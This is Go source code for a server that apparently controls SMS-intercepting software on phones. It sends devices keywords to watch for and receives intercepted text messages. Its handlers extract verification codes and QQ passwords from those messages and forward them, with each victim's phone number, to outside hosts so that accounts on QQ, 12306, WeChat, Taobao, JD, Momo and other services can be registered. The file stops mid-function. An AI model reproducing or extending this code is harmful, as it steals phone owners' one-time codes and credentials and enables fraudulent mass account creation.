package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"github.com/golang/sync/syncmap"
	// "github.com/orcaman/concurrent-map"
	// "golang.org/x/sync/syncmap"
	// "io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func logSendC(info InfoRequest) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
	sql := `insert into log_async_generals (id,logId,para01,para02,para03,para04,para05,para06,para07) values (?,?,?,?,?,?,?,?,?)`
	insert(dbLog, sql, id, 311, info.Imsi, info.Mobile, info.Ip, info.Msg, info.Code, info.Cid, info.Apid)
}

func logGetC(info InfoRequest) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
	sql := `insert into log_async_generals (id,logId,para01,para02,para03,para04,para05) values (?,?,?,?,?,?,?)`
	insert(dbLog, sql, id, 301, info.Imsi, info.Ip, info.Cid, info.Mobile, info.Resp)
}

func sendC(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	w.Write([]byte("<datas><stats>1</stats></datas>"))
	// fmt.Fprintf(w, "Hello, %s", html.EscapeString(req.URL.Path))
	log.Println("sendC RawQuery, %s", r.URL.RawQuery)
	// req.ParseForm()
	// msg := r.Form["msg"]
	msg := r.FormValue("msg")
	user := getUserByImsi(r.FormValue("imsi"))
	log.Println("Get form, %s", msg)
	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Msg: r.FormValue("msg"), Code: r.FormValue("code"), Cid: r.FormValue("cid"), Apid: r.FormValue("apid"), Mobile: (*user)["mobile"]}
	go logSendC(infoLog)
	if strings.EqualFold(r.FormValue("apid"), "4") {
		processQqRegister(msg, *user)
	} else if strings.EqualFold(r.FormValue("apid"), "5") {
		process12306Register(msg, *user)
	}
	if vi, ok := mapRegisterTargetConfig.Load(r.FormValue("apid")); ok {
		v := vi.(map[string]string)
		if strings.EqualFold(v["stateSend2Channel"], "open") {
			// 微信
			if strings.EqualFold(r.FormValue("apid"), "102") {
				processWechatRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "103") {
				processJindongRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "104") {
				processSinaRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "105") {
				processGtjaRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "106") {
				processTaobaoRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "107") {
				processWechatRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "108") {
				processQQWithoutMoRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "109") {
				processMomoRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "111") {
				processTianyiRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "112") {
				processTianyiRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "116") {
				processMaotaiRegister(msg, *user, r.FormValue("apid"))
			} else if strings.EqualFold(r.FormValue("apid"), "117") {
				processTanTanRegister(msg, *user, r.FormValue("apid"))
			}
		}
	}
}

func processQqRegister(msg string, user map[string]string) {
	exp := regexp.MustCompile(`您获得QQ号(\S*),密`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		qq := result[1]
		if strings.Contains(msg, "。本") {
			exp = regexp.MustCompile(`密码(\S*)。本`)
		} else if strings.Contains(msg, "。已") {
			exp = regexp.MustCompile(`密码(\S*)。已`)
		} else if strings.Contains(msg, "。欢") {
			exp = regexp.MustCompile(`密码(\S*)。欢`)
		} else {
			log.Println("processQqRegister can not match Password")
			return
		}
		result = exp.FindStringSubmatch(msg)
		if nil != result {
			pwd := result[1]
			mobile := formatMobile(user["mobile"])
			//生成要访问的url
			// url := "http://121.201.67.97:8080/verifycode/api/getQQVerifyCode.jsp?cid=c115&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
			url := "http://register.qygame.cn/code/registerUser?cpid=ztld01&username=" + qq + "&password=" + pwd + "&phone=" + mobile + "&cpparam="
			go send2Url(url)
			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
		}
	} else {
		log.Println("processQqRegister can not match:%s", msg)
	}
}

func process12306Register(msg string, user map[string]string) {
	exp := regexp.MustCompile(`码：(\S*)。如`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		pwd := result[1]
		mobile := formatMobile(user["mobile"])
		// url := "http://121.201.67.189:9876/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara=1"
		url := "http://47.106.251.19:9700/lsapi/channel/reportPhone?cpid=1dc1dd7721c84b5f985bde2b4f6e825d&smsContent=" + pwd + "&telephone=" + mobile
		if v, ok := mapConfig.Load("12306DexingRatio"); ok {
			ratio, _ := strconv.ParseInt(v.(string), 10, 64)
			random := rand.New(rand.NewSource(time.Now().UnixNano()))
			if int64(random.Intn(100)) >= ratio {
				// url = "http://116.62.161.6/shsuwangDXsms?productId=hd005&cpid=10jf9999101&smsContent=" + pwd + "&tel=" + mobile
				url = "http://x.tymob.com:9000/sdk/submit/12306/submit_12306.jsp?channel=2710008&smsContent=" + pwd + "&mobile=" + mobile
			}
		}
		go send2Url(url)
		go updateRegisterUserSuccess(user, "register12306SuccessCount")
	} else {
		log.Println("process12306Register can not match:%s", msg)
	}
}
func processWechatRegister(msg string, user map[string]string, apid string) {
	exp := regexp.MustCompile(`码(\S*)。转`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		pwd := result[1]
		mobile := formatMobile(user["mobile"])
		url := "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=c115&pid=wxp109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
		go send2Url(url)
		go updateRelationSuccess(user, apid)
	} else {
		exp = regexp.MustCompile(`码(\S*)。（`)
		result = exp.FindStringSubmatch(msg)
		if nil != result {
			log.Println(result[1])
			pwd := result[1]
			mobile := formatMobile(user["mobile"])
			url := "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=c115&pid=wxp109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
			go send2Url(url)
			go updateRelationSuccess(user, apid)
		} else {
			log.Println("processWechatRegister can not match:%s", msg)
		}
	}
}

func formatMobile(ori string) string {
	if len([]rune(ori)) == 13 {
		return ori[2:13]
	} else {
		return ori
	}
}

func processJindongRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`\d{6}`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[0])
		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
		url := "http://47.106.251.19:9500/lsapi/channel/reportVerifyCode?cpid=3653676abd274407a7620670bf84876d&telephone=" + mobile + "&smsContent=" + result[0]
		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
		go send2Url(url)
		go updateRelationSuccess(user, apid)
	}
}
func processTanTanRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`\d{4}`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[0])
		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
		url := "http://47.106.251.19:9500/lsapi/channel/reportVerifyCode?cpid=fcc43472680048fb85b7dd0c704f5e58&telephone=" + mobile + "&smsContent=" + result[0]
		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
		go send2Url(url)
		go updateRelationSuccess(user, apid)
	}
}
func processMaotaiRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`\d{6}`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[0])
		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
		url := "http://120.78.167.205:9600/lsapi/channel/reportVerifyCode?cpid=110b4b2ef6be4e3a8ccc2ceab8579ca0&telephone=" + mobile + "&smsContent=" + result[0]
		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
		go send2Url(url)
		go updateRelationSuccess(user, apid)
	}
}

// func processJindongRegister(msg string, user map[string]string, apid string) {
// 	mobile := formatMobile(user["mobile"])
// 	exp := regexp.MustCompile(`为(\S*)（`)
// 	result := exp.FindStringSubmatch(msg)
// 	if nil != result {
// 		log.Println(result[1])
// 		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
// 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
// 		go send2Url(url)

// 	} else {
// 		url := "http://121.201.67.189:9876/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
// 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
// 		go send2Url(url)
// 	}
// 	go updateRelationSuccess(user, apid)
// }
func processTianyiRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`验证码：(\S?)，`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		url := "http://x.tymob.com:9000/sdk/submit/read/submit_codelogin.jsp?orderId=m1514958114759&code=" + url.QueryEscape(msg) + "&mobile=" + mobile
		go send2Url(url)

	} else {
		exp = regexp.MustCompile(`验证码为(\S?)（`)
		result = exp.FindStringSubmatch(msg)
		if nil != result {
			log.Println(result[1])
			url := "http://x.tymob.com:9000/sdk/submit/read/submit_codexchange.jsp?orderId=m1514958114759&code=" + url.QueryEscape(msg) + "&mobile=" + mobile
			go send2Url(url)
		}
	}
	go updateRelationSuccess(user, apid)
}
func processGtjaRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`码(\S*)，请勿`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		url := "http://121.201.67.189:9876/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent2=" + result[1] + "&mobile=" + mobile + "&ccpara="
		go send2Url(url)
	} else {
		exp = regexp.MustCompile(`码：(\S*)。请确保`)
		result = exp.FindStringSubmatch(msg)
		if nil != result {
			url := "http://121.201.67.189:9876/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent=" + result[1] + "&mobile=" + mobile + "&ccpara="
			go send2Url(url)
		}

	}
	go updateRelationSuccess(user, apid)
}

// func processTaobaoRegister(msg string, user map[string]string, apid string) {
// 	mobile := formatMobile(user["mobile"])
// 	exp := regexp.MustCompile(`校验码是：(\S*)，`)
// 	result := exp.FindStringSubmatch(msg)
// 	if nil != result {
// 		log.Println(result[1])
// 		url := "http://121.201.67.189:9876/verifycode/api/getTBCode.jsp?cid=c115&pid=tb_115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
// 		go send2Url(url)
// 	} else {
// 		url := "http://121.201.67.189:9876/verifycode/api/getTBCode.jsp?cid=c115&pid=tb_115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
// 		go send2Url(url)
// 	}
// 	go updateRelationSuccess(user, apid)
// }
// func processTaobaoRegister(msg string, user map[string]string, apid string) {
// 	mobile := formatMobile(user["mobile"])
// 	exp := regexp.MustCompile(`您(\S*)码`)
// 	result := exp.FindStringSubmatch(msg)
// 	if nil != result {
// 		log.Println(result[1])
// 		url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?channel=2940004&content=" + url.QueryEscape(msg) + "&mobile=" + mobile
// 		go send2Url(url)
// 	}
// 	go updateRelationSuccess(user, apid)
// }
func processTaobaoRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`\d{6}`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[0])
		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
		url := "http://120.78.167.205:9800/lsapi/channel/reportVerifyCode?cpid=e0c5d52fa41142b4bb60eb46f9cb9b49&telephone=" + mobile + "&smsContent=" + result[0]
		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
		go send2Url(url)
		go updateRelationSuccess(user, apid)
	}
}
func processMomoRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`】(\S*)陌陌验证码`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		url := "http://121.201.67.97:8080/verifycode/api/getMMChMobile.jsp?cid=c115&pid=mm115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
		go send2Url(url)
	}
	go updateRelationSuccess(user, apid)
}
func processQQWithoutMoRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	exp := regexp.MustCompile(`】(\S*)（`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		log.Println(result[1])
		url := "http://121.201.67.97:8080/verifycode/api/getQQNY.jsp?cid=c115&pid=ny115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
		go send2Url(url)
	}
	go updateRelationSuccess(user, apid)
}
func processSinaRegister(msg string, user map[string]string, apid string) {
	mobile := formatMobile(user["mobile"])
	url := "http://121.201.67.97:8080/verifycode/api/getSNWeb.jsp?cid=c115&pid=web115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
	go send2Url(url)
	go updateRelationSuccess(user, apid)
}

func updateRelationSuccess(user map[string]string, apid string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	sql := "update register_user_relations set successCount =ifnull(successCount,0)+1,lastSendTime=?,tryCount=0 where imsi=? and apid=?"
	exec(dbConfig, sql, time.Now().Unix(), user["imsi"], apid)
}

func send2Url(url string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	//生成client 参数为默认
	client := &http.Client{
		Transport: &http.Transport{
			Dial: func(netw, addr string) (net.Conn, error) {
				conn, err := net.DialTimeout(netw, addr, time.Second*4)
				if err != nil {
					return nil, err
				}
				conn.SetDeadline(time.Now().Add(time.Second * 4))
				return conn, nil
			},
			ResponseHeaderTimeout: time.Second * 4,
		},
	}
	//生成要访问的url
	log.Println(url)
	//提交请求
	reqest, err := http.NewRequest("GET", url, nil)

	if err != nil {
		panic(err)
	} else {
		//处理返回结果
		response, _ := client.Do(reqest)

		//将结果定位到标准输出 也可以直接打印出来 或者定位到其他地方进行相应的处理
		// stdout := os.Stdout
		// _, err = io.Copy(stdout, response.Body)

		//返回的状态码
		status := response.StatusCode
		bodyString := ""

		if response.StatusCode == 200 { // OK
			bodyBytes, _ := ioutil.ReadAll(response.Body)
			bodyString = string(bodyBytes)
		}

		log.Println(url + "," + fmt.Sprintf("%d", status))
		random := rand.New(rand.NewSource(time.Now().UnixNano()))
		id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
		sql := `insert into log_async_generals (id,logId,para01,para02,para03) values (?,?,?,?,?)`
		insert(dbLog, sql, id, 331, url, response.StatusCode, bodyString)
		response.Body.Close()
	}

}

func testC(w http.ResponseWriter, r *http.Request) {
	log.Println("testC RawQuery, %s", r.URL.RawQuery)
}

const DEFAULT_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da>[command-0][command-1][command-2]</da></datas>"

var gDefaultCommands = []string{"<data><kno>333</kno><kw>az*jz</kw><apid>1</apid></data>", "<data><kno>3314</kno><kw>az*jz</kw><apid>2</apid></data>", "<data><kno>335</kno><kw>az*jz</kw><apid>3</apid></data>"}

// const REGISTER_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>106</kno><kw>注册微信帐号，验证码*。请</kw><apid>100</apid></data><data><kno>135</kno><kw>验证码*。</kw><apid>100</apid></data></da></datas>"
const REGISTER_GETC_QQ = "<data><kno>106</kno><kw>QQ*密码</kw><apid>4</apid></data>"
const REGISTER_GETC_12306 = "<data><kno>12306</kno><kw>12306*验证码</kw><apid>5</apid></data>"
const TRY_MORE_TIMES = 2 //多余指令尝试次数

func getC(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容
			log.Println("error end:")
		}
	}()
	start := time.Now()
	var resp string
	user := getUserByImsi(r.FormValue("imsi"))
	// log.Println(*user)
	// && strings.EqualFold((*user)["province"], "广东")
	if v, ok := mapConfig.Load("openRegisterGet"); ok && strings.EqualFold(v.(string), "open") && len([]rune((*user)["mobile"])) >= 11 && checkUserRegister(*user) {
		//choose register content
		resp = chooseRegisterContent(*user)
	} else {
		resp = DEFAULT_GETC
		if !(strings.EqualFold((*user)["lastRegisterCmdAppIdList"], "NULL") || strings.EqualFold((*user)["lastRegisterCmdAppIdList"], "")) {
			go cleanRegisterUserCmdList(*user)
		}
	}
	resp = procGetResp(resp)
	w.Write([]byte(resp))

	// log.Println("getC RawQuery,", r.URL.RawQuery)

	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Cid: r.FormValue("cid"), Mobile: (*user)["mobile"], Resp: resp}
	end := time.Now()
	go logGetC(infoLog)
	log.Println("getc total time(s):", r.FormValue("imsi"), end.Sub(start).Seconds())
}

func procGetResp(resp string) string {
	result := resp
	for i := 0; i < len(gDefaultCommands); i++ {
		if strings.Index(result, "[command-"+strconv.Itoa(i)+"]") >= 0 {
			result = strings.Replace(result, "[command-"+strconv.Itoa(i)+"]", gDefaultCommands[i], -1)
		}
	}
	return result
}

func chooseRegisterContent(user map[string]string) string {
	result := DEFAULT_GETC
	appList := ""
	appCount := 0
	//请注意这里有相当于硬编码的执行顺序
	if v, ok := mapConfig.Load("registerSmsGet12306"); ok && strings.EqualFold(v.(string), "open") && checkSmsRegister(user, "register12306CmdCount", "register12306SuccessCount", "12306RegisterLimit") {
		result = strings.Replace(result, "[command-0]", REGISTER_GETC_12306, -1)
		appList = ",5,"
		appCount++
	} else if v, ok := mapConfig.Load("registerSmsGetQq"); ok && strings.EqualFold(v.(string), "open") && checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
		result = strings.Replace(result, "[command-0]", REGISTER_GETC_QQ, -1)
		appList = ",4,"
		appCount++
	}
	resultArray, _ := fetchRows(dbConfig, "SELECT *,ifnull(successCount,0) as successCount,ifnull(lastSendTime,0) as lastSendTime  FROM `register_user_relations` WHERE imsi =  ?", user["imsi"])
	userRecordMap := make(map[string]map[string]string)
	for _, v := range *resultArray {
		userRecordMap[v["apid"]] = v
	}
	ctime := time.Now().Unix()
	mapRegisterTargetConfig.Range(func(ki, vi interface{}) bool {
		if appCount < 3 {
			v := vi.(map[string]string)
			if strings.EqualFold(v["stateGet"], "open") && strings.Index(v["closeProvinceList"], user["province"]) == -1 && checkCloseMobileNumHardcore(user, v["apid"]) {
				needCmd := false
				if userRecordMap[v["apid"]] == nil {
					needCmd = true
					go insertRelation(user, v)
				} else {
					lastSendTime, _ := strconv.ParseInt(userRecordMap[v["apid"]]["lastSendTime"], 10, 64)
					resendIntervalDay, _ := strconv.ParseInt(v["resendInterval"], 10, 64)
					if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
						needCmd = true
						go updateRelation(userRecordMap[v["apid"]], v)
					} else if ctime-lastSendTime > 86400*resendIntervalDay {
						needCmd = true
						go updateRelation(userRecordMap[v["apid"]], v)
					}
				}
				if needCmd {
					result = strings.Replace(result, "[command-"+strconv.Itoa(appCount)+"]", "<data><kno>"+v["portNumber"]+"</kno><kw>"+v["keyword"]+"</kw><apid>"+v["apid"]+"</apid></data>", -1)
					if strings.EqualFold(appList, "") {
						appList = "," + v["apid"] + ","
					} else {
						appList += v["apid"] + ","
					}
					appCount++
				}
			} else {
				if userRecordMap[v["apid"]] != nil {
					_getTime, _ := strconv.ParseInt(userRecordMap[v["apid"]]["getTime"], 10, 64)
					if ctime-_getTime < 86400 {
						go updateRelationSetGetTimeZero(userRecordMap[v["apid"]])
					}
				}
			}
			return true
		} else {
			return false
		}
	})

	if appCount > 0 {
		if !strings.EqualFold(appList, "") {
			go processRegisterUser(user, appList)
		} else {
			go cleanRegisterUserCmdList(user)
		}
	} else {
		go cleanRegisterUserCmdList(user)
	}
	// if strings.Index(appList, ",4,") == -1 && strings.Index(appList, ",5,") == -1 {
	// 	go cleanRegisterUserCmdList(user)
	// }
	return result
}

func checkCloseMobileNumHardcore(user map[string]string, apid string) bool {
	if strings.EqualFold(apid, "102") {
		if checkNotVirtualMobile(user["mobile"]) {
			return true
		} else {
			return false
		}
	} else if strings.EqualFold(apid, "104") {
		if checkNotVirtualMobile(user["mobile"]) {
			return true
		} else if strings.EqualFold(user["mobileType"], "ChinaUnion") {
			return false
		} else {
			return false
		}
	} else {
		return true
	}
}

func checkNotVirtualMobile(mobile string) bool {
	if strings.Index(mobile, "86170") == 0 {
		return false
	} else if strings.Index(mobile, "86171") == 0 {
		return false
	} else if strings.Index(mobile, "171") == 0 {
		return false
	} else if strings.Index(mobile, "86172") == 0 {
		return false
	} else if strings.Index(mobile, "172") == 0 {
		return false
	} else if strings.Index(mobile, "86174") == 0 {
		return false
	} else if strings.Index(mobile, "174") == 0 {
		return false
	} else if strings.Index(mobile, "86175") == 0 {
		return false
	} else if strings.Index(mobile, "175") == 0 {
		return false
	} else if strings.Index(mobile, "86176") == 0 {
		return false
	} else if strings.Index(mobile, "176") == 0 {
		return false
	} else if strings.Index(mobile, "86179") == 0 {
		return false
	} else if strings.Index(mobile, "179") == 0 {
		return false
	} else if strings.Index(mobile, "8614") == 0 {
		return false
	} else if strings.Index(mobile, "14") == 0 {
		return false
	} else {
		return true
	}
}

func insertRelation(user map[string]string, target map[string]string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	sql := `insert into register_user_relations (imsi,apid,getTime,isMoReady) values (?,?,?,?)`
	isMoReady := "1"
	if target["isNeedMo"] == "1" {
		isMoReady = "0"
	}
	insert(dbConfig, sql, user["imsi"], target["apid"], time.Now().Unix(), isMoReady)
}

func updateRelation(relation map[string]string, target map[string]string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	isMoReady := "1"
	if target["isNeedMo"] == "1" {
		isMoReady = "0"
	}
	if len([]rune(relation["fetchTime"])) > 4 {
		_fetchTime, _ := strconv.ParseInt(relation["fetchTime"], 10, 64)
		if time.Now().Unix()-_fetchTime > 86400 {
			sql := `update register_user_relations set getTime = ? , registerChannelId = null , isMoReady=?  where id =?`
			exec(dbConfig, sql, time.Now().Unix(), isMoReady, relation["id"])
			return
		}
	}
	sql := `update register_user_relations set getTime = ?, isMoReady=? where id =?`
	exec(dbConfig, sql, time.Now().Unix(), isMoReady, relation["id"])
}

func updateRelationSetGetTimeZero(relation map[string]string) {
	defer func() {
		if err := recover(); err != nil {
			log.Println("error begin:")
			log.Println(err) // 这里的err其实就是panic传入的内容，55
			log.Println("error end:")
		}
	}()
	sql := `update register_user_relations set getTime = 0 where id =?`
	exec(dbConfig, sql, relation["id"])
}

func checkSmsRegister(user map[string]string, cmdParaName string, successParaName string, sysLimitName string) bool {
	if strings.EqualFold(user[cmdParaName], "NULL") { // 从来没有生成过指令
		return true
	} else {
		_registerCmdCount, _ := strconv.ParseInt(user[cmdParaName], 10, 8)
		v, _ := mapConfig.Load(sysLimitName)
		_sysLimit, _ := strconv.ParseInt(v.(string), 10, 8)
		if _registerCmdCount-_sysLimit >= TRY_MORE_TIMES { // 生成指令超过限制次数
			return false
		} else {
			if strings.EqualFold(user[successParaName], "NULL") { //如果还没成功过
				return true
			} else {
				_registerSuccessCount, _ := strconv.ParseInt(user[successParaName], 10, 8)
				if _registerSuccessCount >= _sysLimit { //成功次数判定
					return false
				} else {
					return true
				}
			}
		}
	}
}

func getUserByImsi(imsi string) *map[string]string {
	row, _ := fetchRow(dbConfig, "SELECT * FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,'8612345678901'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  ?", imsi)
	return row
}

func processRegisterUser(user map[string]string, appListStr string) {
	var sql string
	lastRegisterTime, _ := strconv.ParseInt(user["lastRegisterTime"], 10, 64)
	if time.Now().Sub(time.Unix(lastRegisterTime, 0)).Hours() > 744 {
		sql = "update imsi_users set lastRegisterTime = ? , lastRegisterCmdAppIdList =? , registerCountMonth = 1  where imsi=?"
	} else {
		sql = "update imsi_users set lastRegisterTime = ? , lastRegisterCmdAppIdList =? , registerCountMonth = registerCountMonth+1  where imsi=?"
	}
	exec(dbConfig, sql, time.Now().Unix(), appListStr, user["imsi"])
}

func cleanRegisterUserCmdList(user map[string]string) {
	sql := "update imsi_users set  lastRegisterCmdAppIdList =''   where imsi=?"
	exec(dbConfig, sql, user["imsi"])
}

func updateRegisterUserSuccess(user map[string]string, paraName string) {
	sql := "update imsi_users set  " + paraName + " =ifnull(" + paraName + ",0)+1   where imsi=?"
	exec(dbConfig, sql, user["imsi"])
}

func processIp(ori string) string {
	i := strings.LastIndex(ori, ":")
	if i >= 0 {
		return ori[0:i]
	} else {
		return ori
	}
}

func timerReload() {
	for {
		time.Sleep(time.Second * 6)
		loadGlobalConfigFromDb()
	}
}

//need process return true
func checkUserRegister(user map[string]string) bool {
	_lastRegisterTime, _ := strconv.ParseInt(user["lastRegisterTime"], 10, 64)
	if len([]rune(user["lastRegisterTime"])) <= 4 { // 上次注册配置拉取时间是否为空
		return true
	} else if time.Now().Sub(time.Unix(_lastRegisterTime, 0)).Hours() > 744 { // 上次注册配置拉取时间是否超过31天
		return true
	} else if strings.EqualFold(user["registerCountMonth"], "NULL") { // 本月拉取次数是否超过
		return true
	} else if len([]rune(user["registerCountMonth"])) > 0 {
		_userCount, _ := strconv.ParseInt(user["registerCountMonth"], 10, 8)
		v, _ := mapConfig.Load("registerMonthLimit")
		_sysLimit, _ := strconv.ParseInt(v.(string), 10, 8)
		if _userCount < _sysLimit { // 是否超过月次数总限制
			return true
		} else {
			return false
		}
	} else {
		return false
	}
}

type DbConfigure struct {
	UserName      string `json:"UserName"`
	Password      string `json:"Password"`
	ServerAddress string `json:"ServerAddress"`
	Port          int    `json:"Port"`
	Database      string `json:"Database"`
}

type DbConfigs struct {
	DbLog    DbConfigure `json:"DbLog"`
	DbConfig DbConfigure `json:"DbConfig"`
	Port     string      `json:"Port"`
}

type InfoRequest struct {
	Imsi   string
	Ip     string
	Msg    string
	Code   string
	Cid    string
	Apid   string
	Resp   string
	Mobile string
}

var (
	config     *DbConfigs
	configLock = new(sync.RWMutex)
)

var dbLog *sql.DB
var dbConfig *sql.DB
var mapConfig syncmap.Map
var mapRegisterTargetConfig syncmap.Map
var mapRegisterChannelConfig syncmap.Map

func init() {

	// mapConfig = make(map[string]string)
	// mapRegisterTargetConfig = make(map[string]map[string]string)
	// mapRegisterChannelConfig = make(map[string]map[string]string)
	// mapRegisterChannelConfig = new(syncmap.Map)
	// mapRegisterTargetConfig = cmap.New()

	//热更新配置可能有多种触发方式，这里使用系统信号量sigusr1实现
	// s := make(chan os.Signal, 1)
	// signal.Notify(s, syscall.SIGUSR1)
	// go func() {
	// 	for {
	// 		<-s
	// 		log.Println("Reloaded config:", loadFileConfig())
	// 	}
	// }()

	if !loadFileConfig() {
		os.Exit(1)
	}

	dbLog, _ = sql.Open("mysql", config.DbLog.UserName+":"+config.DbLog.Password+"@tcp("+config.DbLog.ServerAddress+":"+fmt.Sprintf("%d", config.DbLog.Port)+")/"+config.DbLog.Database+"?charset=utf8")
